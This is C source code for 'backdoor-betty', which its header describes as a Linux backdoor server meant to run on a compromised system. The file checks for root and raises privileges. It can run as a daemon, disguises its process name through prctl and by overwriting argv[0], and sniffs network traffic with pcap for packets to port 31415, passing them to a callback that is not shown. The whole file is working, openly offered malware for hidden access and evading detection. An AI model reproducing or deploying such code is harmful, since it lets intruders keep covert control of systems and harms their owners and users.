/*-----------------------------------------------------------------------------
 * backdoor-betty.c - Linux backdoor server (runs on comprimised system)
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "backdoor-betty.h"
#include "utils.h"
#include "pkt_cap.h"

/*-----------------------------------------------------------------------------
 * FUNCTION:    main 
 * 
 * DATE:        June 4, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   int main(int argc, char **argv)
 *                  argc - argument count
 *                  argv - array of arguments
 * 
 * RETURNS:     Result on success or failure.
 *
 * NOTES: Main entry point into the program. Parses command-line arguments and
 *        configures the server.
 *
 *----------------------------------------------------------------------------*/
int main(int argc, char *argv[])
{
	/* make sure user is root */
	if (geteuid() != USER_ROOT) {
		fprintf(stderr, "Must be root to run this program.\n");
		exit(ERROR_NOTROOT);
	}

	/* parse CLI options */
	if (parse_options(argc, argv) == ERROR_OPTS) {
		err(1, "Invalid options");
		exit(ERROR_OPTS);
	}

	print_settings(argv[0]);

    signal(SIGTERM, signal_handler);
    signal(SIGQUIT, signal_handler);
    signal(SIGKILL, signal_handler);
    signal(SIGINT, signal_handler);
	
	/* raise privileges */
	if (set_root() == ERROR_NOTROOT) {
		err(1, "set_root");
	}

	/* daemonize the process */
	if (svr_vars.daemonize)
		daemonize();

	/* mask the process name */
	mask_process(argv, PROCESS_NAME);

	start_server();

	return ERROR_NONE;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    print_settings
 * 
 * DATE:        May 17, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void print_settings(char *command)
 *                   command - the program's name
 * 
 * RETURNS: void
 * 
 * NOTES: Prints out the current settings that are being used in the current
 *        run of the application.
 *
 *----------------------------------------------------------------------------*/
void print_settings(char *command)
{
	fprintf(stderr, "Using the Following Options: (For help use \"%s -h\")\n", command);
	if (svr_vars.daemonize)
		fprintf(stderr, "  Running as daemon:   TRUE\n");
	else
		fprintf(stderr, "  Running as daemon:   FALSE\n");
		fprintf(stderr, "  Masking process as:  %s\n", PROCESS_NAME);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    print_usage
 * 
 * DATE:        May 18, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void print_usage(char *command, int err)
 *                   command - the program's name
 *                   err - error produced
 * 
 * RETURNS: void
 * 
 * NOTES: Prints out the program's useage information if the user incorrectly
 *        entered an option or used the -h or --help option.
 *
 *----------------------------------------------------------------------------*/
void print_usage(char *command, int err)
{
    if (err == ERROR_OPTS_HELP) {
        fprintf(stderr, "usage: %s [arguments]\n\n", command);
        fprintf(stderr, "Arguments:\n");
        fprintf(stderr, "  -d  or  --daemon  Run as a background daemon\n");
        fprintf(stderr, "  -h  or  --help    Prints out this screen\n");
		exit(ERROR_OPTS_HELP);
    }
	else if (err == ERROR_OPTS)
        fprintf(stderr, "Try `%s --help` for more information.\n", command);
	else {
        fprintf(stderr, "%s: unknown error\n", command);
        fprintf(stderr, "Try `%s --help` for more information.\n", command);
    }	
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    parse_options 
 * 
 * DATE:        May 17, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   parse_options(int argc, char *argv[])
 *                    argc - argument count
 *                    argv - argument list
 * 
 * RETURNS:     ERROR_NONE on success ERROR_OPTS on failure.
 * 
 * NOTES: Sets default options and parses any command-line options.
 *
 *----------------------------------------------------------------------------*/
int parse_options(int argc, char *argv[])
{
	int c, option_index = 0;

	static struct option long_options[] =
	{
		{"daemon"		, no_argument		, 0, 'd'},
		{"help"			, no_argument		, 0, 'h'},
		{0, 0, 0, 0}
	};

	/* set defaults */
	svr_vars.daemonize = FALSE;
	print_output = TRUE;
	server = TRUE;

	/* parse options */
	while (TRUE) {
		c = getopt_long(argc, argv, "dh", long_options, &option_index);

		if (c == -1)
			break;

		switch (c) {
			case 0:
				if (long_options[option_index].flag != 0)
					break;
				break;

			case 'd':
				svr_vars.daemonize = TRUE;
				print_output = FALSE;
				break;

			case 'h':
				print_usage(argv[0], ERROR_OPTS_HELP);
				break;			

			default:
				print_usage(argv[0], ERROR_OPTS);
				return ERROR_OPTS;
				break;
		}
	}

	return ERROR_NONE;
}

void signal_handler(int sig)
{
	switch(sig) {
		case SIGTERM:
			if (!svr_vars.daemonize)
				fprintf(stderr, "Received SIGTERM, terminating.\n");
			exit_clean();
		case SIGQUIT:
			if (!svr_vars.daemonize)
				fprintf(stderr, "Received SIGQUIT, terminating.\n");
			exit_clean();
		case SIGKILL:
			if (!svr_vars.daemonize)
				fprintf(stderr, "Received SIGKILL, terminating.\n");
			exit_clean();
		case SIGINT:
			if (!svr_vars.daemonize)
				fprintf(stderr, "\nReceived SIGINT, terminating.\n");
			exit_clean();
		default:
			break;
	}
}

void exit_clean()
{
	if (!svr_vars.daemonize)
		fprintf(stderr, "Exited cleanly.\n");
	exit(ERROR_NONE);
}

void daemonize()
{
	pid_t pid;

	/* fork off the parent process */
	pid = fork();
	if (pid < ERROR_NONE)
		err(1, "fork");
	else if (pid > ERROR_NONE) /* exit parent process */
		exit(ERROR_NONE);
}

void mask_process(char *argv[], char *name)
{
	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], name);
	prctl(PR_SET_NAME, name, 0, 0);
}

void start_server()
{
	char *dev = NULL;					/* capture device */
	char err_buff[PCAP_ERRBUF_SIZE];	/* error buffer */
	pcap_t *handle;						/* packet capture handle */
	bpf_u_int32 mask;					/* subnet mask */
	bpf_u_int32 net;					/* ip address */

	char filter_exp[] = "dst port 31415";
	struct bpf_program fp;				/* compiled filter program */

	/* find a capture device */
	if ((dev = pcap_lookupdev(err_buff)) == NULL) {
		if (!svr_vars.daemonize)
			fprintf(stderr, "Could not find default device: %s\n", err_buff);
		exit(ERROR_PCAP);
	}

	/* get netmask and IP */
	if (pcap_lookupnet(dev, &net, &mask, err_buff) == ERROR_GENERAL) {
		if (!svr_vars.daemonize)
			fprintf(stderr, "Could not get IP/netmask for device %s: %s\n", dev, err_buff);
		net = 0;
		mask = 0;
	}

	/* print capture info */
	if (!svr_vars.daemonize) {
		fprintf(stderr, "Device: %s\n", dev);
		fprintf(stderr, "Filter expression: %s\n", filter_exp);
	}

	/* open capture device */
	if ((handle = pcap_open_live(dev, MAX_PKT_LEN, 1, 1000, err_buff)) == NULL) {
		if (!svr_vars.daemonize)
			fprintf(stderr, "Could not open device %s: %s\n", dev, err_buff);
		exit(ERROR_PCAP);
	}

	/* make sure we're capturing from an ethernet device */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		if (!svr_vars.daemonize)
			fprintf(stderr, "%s is not an Ethernet device\n", dev);
		exit(ERROR_PCAP);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == ERROR_GENERAL) {
		if (!svr_vars.daemonize)
			fprintf(stderr, "Could not parse expression filter %s: %s\n",
					filter_exp, pcap_geterr(handle));
		exit(ERROR_PCAP);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == ERROR_GENERAL) {
		if (!svr_vars.daemonize)
			fprintf(stderr, "Could not install filter %s: %s\n",
					filter_exp, pcap_geterr(handle));
		exit(ERROR_PCAP);
	}

	/* set the callback function */
	pcap_loop(handle, -1, packet_callback, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);
	
	if (!svr_vars.daemonize)
		printf("\nCapture complete.\n");
}
